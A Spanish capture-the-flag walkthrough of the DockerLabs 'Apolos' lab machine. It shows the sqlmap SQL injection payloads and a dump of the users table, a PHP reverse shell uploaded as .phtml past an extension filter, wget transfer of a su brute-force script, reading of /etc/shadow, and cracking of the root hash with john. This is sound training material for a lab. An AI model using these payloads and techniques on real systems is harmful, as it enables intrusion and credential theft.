---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Apolos DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip apolos.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh apolos.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 10:17 EST
Nmap scan report for 172.17.0.2
Host is up (0.000039s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apple Store
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

Vemos una pagina normal de `Apple` pero nada fuera de lo normal, si nos vamos al `cuenta` vemos que nos aparece un inicio de sesion, probando con las credenciales por defecto no encontraremos nada, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/img                  (Status: 200) [Size: 1971]
/index.php            (Status: 200) [Size: 5013]
/login.php            (Status: 200) [Size: 1619]
/logout.php           (Status: 200) [Size: 1619]
/mycart.php           (Status: 200) [Size: 1619]
/profile.php          (Status: 200) [Size: 1619]
/register.php         (Status: 200) [Size: 1607]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 200) [Size: 741]
/vendor               (Status: 200) [Size: 1528]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos bastantes directorios interesantes entre ellos uno llamado `/register.php` que por lo que vemos nos podremos logear, por lo que vamos a entrar ahi.

```
URL = http://<IP>/register.php
```

Cuando nos hayamos registrado y nos muestre este mensaje:

```
Registro exitoso. Puedes iniciar sesión ahora.
```

Iremos a la siguiente `URL` para meternos con dichas credenciales:

```
URL = http://<IP>/login.php
```

Una vez dentro con las credenciales que hemos metido, veremos que iniciamos sesion de forma correcta.

Veremos que no tenemos mucho que hacer, pero si nos vamos donde neustro `carrito` veremos que hay varios productos y una barra de buscar bastante interesante, vamos a probar si fuera vulnerable a un `SQL Injection`, vamos a capturar la peticion de la barra de busqueda con cualquier palabra insertada con `BurpSuite` para darselo a `sqlmap` y probar si es vulnerable a un `SQL Injection`.

## sqlmap

> request.txt

```
GET /mycart.php?search=test HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/mycart.php?search=
Cookie: PHPSESSID=nmh1hkm9ivvfnomusa1s629eiv
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Habiendo capturado la peticion con `BurpSuite` y pasarlo a un `.txt` pondremos lo siguiente para probar si es vulenrable.

```shell
sqlmap -r request.txt --dbs --batch
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:31:33 /2025-02-01/

[10:31:33] [INFO] parsing HTTP request from 'request.txt'
[10:31:33] [INFO] testing connection to the target URL
[10:31:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:31:33] [INFO] testing if the target URL content is stable
[10:31:33] [INFO] target URL content is stable
[10:31:33] [INFO] testing if GET parameter 'search' is dynamic
[10:31:33] [WARNING] GET parameter 'search' does not appear to be dynamic
[10:31:33] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[10:31:33] [INFO] testing for SQL injection on GET parameter 'search'
[10:31:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:31:33] [WARNING] reflective value(s) found and filtering out
[10:31:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:31:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:31:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:31:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:31:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:31:34] [INFO] testing 'Generic inline queries'
[10:31:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:31:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:31:34] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:31:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:31:54] [INFO] GET parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:31:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:31:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:31:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:31:54] [INFO] target URL appears to have 5 columns in query
[10:31:54] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: search (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 8749 FROM (SELECT(SLEEP(5)))qTux) AND 'NVPu'='NVPu

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716a707a71,0x4e4e49566876625a696f78554376434a656f7478576e6b7171427446716c685269424761574a6e4a,0x71716a7671),NULL,NULL-- -
---
[10:31:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:31:54] [INFO] fetching database names
available databases [5]:
[*] apple_store
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[10:31:54] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 26 times
[10:31:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:31:54 /2025-02-01/
```

Vemos que si lo es y nos muestra las bases de datos que hay, por lo que vamos a ver que tablas contiene la base de datos llamada `apple_store` que es la mas interesante.

```shell
sqlmap -r request.txt --dbs --batch -D apple_store --threads 10 --tables
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.8.11#stable}                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:33:07 /2025-02-01/

[10:33:07] [INFO] parsing HTTP request from 'request.txt'
[10:33:08] [INFO] resuming back-end DBMS 'mysql' 
[10:33:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 8749 FROM (SELECT(SLEEP(5)))qTux) AND 'NVPu'='NVPu

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716a707a71,0x4e4e49566876625a696f78554376434a656f7478576e6b7171427446716c685269424761574a6e4a,0x71716a7671),NULL,NULL-- -
---
[10:33:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:33:08] [INFO] fetching database names
available databases [5]:
[*] apple_store
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[10:33:08] [INFO] fetching tables for database: 'apple_store'
[10:33:08] [WARNING] reflective value(s) found and filtering out
Database: apple_store
[2 tables]
+-----------+
| productos |
| users     |
+-----------+

[10:33:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:33:08 /2025-02-01/
```

Vemos que la tabla que mas nos interesa es la llamada `users`, por lo que sacaremos toda la info de dicha tabla.

```shell
sqlmap -r request.txt --dbs --batch -D apple_store -T users --threads 10 --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___["]_____ ___ ___  {1.8.11#stable}                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:34:34 /2025-02-01/

[10:34:34] [INFO] parsing HTTP request from 'request.txt'
[10:34:34] [INFO] resuming back-end DBMS 'mysql' 
[10:34:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 8749 FROM (SELECT(SLEEP(5)))qTux) AND 'NVPu'='NVPu

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716a707a71,0x4e4e49566876625a696f78554376434a656f7478576e6b7171427446716c685269424761574a6e4a,0x71716a7671),NULL,NULL-- -
---
[10:34:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:34:34] [INFO] fetching database names
available databases [5]:
[*] apple_store
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[10:34:34] [INFO] fetching columns for table 'users' in database 'apple_store'
[10:34:34] [INFO] fetching entries for table 'users' in database 'apple_store'
[10:34:34] [WARNING] reflective value(s) found and filtering out
[10:34:34] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[10:34:34] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[10:34:34] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[10:34:34] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[10:34:34] [INFO] starting 8 processes 
[10:34:40] [INFO] cracked password 'test' for user 'test'                                                                                                   
[10:34:40] [INFO] cracked password 'test' for user 'test'                                                                                                   
Database: apple_store                                                                                                                                       
Table: users
[4 entries]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 761bb015d7254610f89d9a7b6b152f1df2027e0a        | luisillo |
| 2  | 7f73ae7a9823a66efcddd10445804f7d124cd8b0        | admin    |
| 3  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | test     |
| 4  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | diseo    |
+----+-------------------------------------------------+----------+

[10:34:41] [INFO] table 'apple_store.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/apple_store/users.csv'
[10:34:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:34:41 /2025-02-01/
```

Vemos que nos saca varias credenciales, pero sus contraseñas estan `hasheadas` por lo que vamos a intentar `crackear` la contraseña al menos del usuario `admin` y `luisillo`, ya que los demas usuarios no tienen importancia.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
admin:0844575632
luisillo:mundodecaramelo
```

URL = [Pagina CrackNet](https://crackstation.net/)

## Escalate user www-data

Vemos que hemos conseguido `crackear` los dos usuarios, pero vamos a entrar con el de `admin` ya que tiene mas pinta el otro usuario de ser uno del sistema.

Por lo que tendremos que irnos al apartado de `login.php` y meter las siguientes credenciales.

```
User: admin
Pass: 0844575632
```

Una vez dentro como el usuario `admin` vemos que abajo del todo nos pone una opcion de `Ir al panel del administrador`, si le damos nos llevara a la siguiente direccion.

```
URL = http://<IP>/admin_dashboard.php
```

Si nos vamos a la seccion llamada `Configuracion` veremos que nos permite subir un archivo, vamos a probar a subir un archivo `.php` para crearnos una `reverse shell`, pero cuando lo subamos nos pondra que es potencialmente peligroso, por lo que vamos a intentar `bypassear` la extension, por si fuera la extension de la siguiente forma.

```shell
nano shell.phtml

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Lo guardamos y ahora probaremos a subirlo, cuando le demos a subir y lo enviemos, veremos que nos pone el siguiente mensaje:

```
Archivo subido con éxito.
```

Por lo que vemos hemos podido `bypassear` la extension del archivo y si recordamos anteriormente en el `gobuster` tenemos un directorio llamado `/uploads` por lo que iremos a el que es donde seguramente este ese archivo.

```
URL = http://<IP>/uploads/
```

Vemos que efectivamente esta nuestro archivo, pero antes de pulsarlo nos pondremos a al escucha.

```shell
nc -lvnp <PORT>
```

Y si ahora pulsamos el archivo en la web, y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 59450
whoami
www-data
```

Vemos que somos el usuario `www-data`, por lo que tendremos que sanitizar un poco la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user luisillo

Vemos que esta el siguiente usuario en el sistema.

```shell
cat /etc/passwd | grep "/bin/sh"
```

Info:

```
luisillo_o:x:1001:1001::/home/luisillo_o:/bin/sh
```

Pero si probamos con la contraseña que encontramos anteriormente no nos funcionara, por lo que vamos a probar a tirarle fuerza bruta con el comando `su` con el siguiente script llamado `suBruteforce.sh`.

URL = [suBruteforce.sh GitHub](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Primero nos tendremos que copiar el codigo del `sh` en nuestra maquina `host` en un archivo `.sh` y despues nos copiaremos el `rockyou.txt` a nuestro directorio actual, en el abriremos un servidor de `python3` para pasarnos todo a la maquina victima.

```shell
python3 -m http.server
```

Una vez teniendo el server activo, en la maquina victima haremos lo siguiente:

```shell
cd /tmp
wget http://<IP>:8000/suBruteforce.sh
wget http://<IP>:8000/rockyou.txt
```

Una vez pasado todo, tendremos que ver los siguiente archivos en la carpeta `/tmp`.

```shell
ls -la /tmp
```

Info:

```
total 136656
drwxrwxrwt 1 root     root          4096 Feb  1 15:54 .
drwxr-xr-x 1 root     root          4096 Feb  1 15:17 ..
-rw-r--r-- 1 www-data www-data 139921507 Feb  1 15:53 rockyou.txt
-rw-r--r-- 1 www-data www-data      1517 Feb  1 15:53 suBruteforce.sh
```

Por lo que ejecutaremos el script de la siguiente forma:

```shell
bash suBruteforce.sh luisillo_o rockyou.txt
```

Info:

```
[+] Contraseña encontrada para el usuario luisillo_o:19831983
```

Ahora haremos lo siguiente:

```shell
su luisillo_o
```

Metemos como contraseña `19831983` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos lo siguiente podremos leer el `shadow`:

```shell
cat /etc/shadow
```

Info:

```
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07:19969:0:99999:7:::
daemon:*:19936:0:99999:7:::
bin:*:19936:0:99999:7:::
sys:*:19936:0:99999:7:::
sync:*:19936:0:99999:7:::
games:*:19936:0:99999:7:::
man:*:19936:0:99999:7:::
lp:*:19936:0:99999:7:::
mail:*:19936:0:99999:7:::
news:*:19936:0:99999:7:::
uucp:*:19936:0:99999:7:::
proxy:*:19936:0:99999:7:::
www-data:*:19936:0:99999:7:::
backup:*:19936:0:99999:7:::
list:*:19936:0:99999:7:::
irc:*:19936:0:99999:7:::
_apt:*:19936:0:99999:7:::
nobody:*:19936:0:99999:7:::
ubuntu:!:19936:0:99999:7:::
_galera:!:19966::::::
mysql:!:19966::::::
luisillo_o:$y$j9T$jeXc8lTJhOBTedetDcKHI/$Bo6qPkbZFVsfWoTJvAZ1x0t2jG3aGsHjOjxkqOpBGg6:19969:0:99999:7:::
```

Vamos a coger el `hash` del usuario `root` e intentar crackearlo con `john` de la siguiente forma:

> hash

```
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07:19969:0:99999:7:::
```

```shell
john --format=crypt --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainbow2         (root)     
1g 0:00:00:42 DONE (2025-02-01 11:24) 0.02368g/s 304.6p/s 304.6c/s 304.6C/s rainbow2..wendel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que lo pudimos `crackear`, por lo que haremos lo siguiente en la maquina victima:

```shell
su root
```

Metemos como contraseña `rainbow2` y veremos que somos el usuario `root`, por lo que ya habremos terminado la maquina.
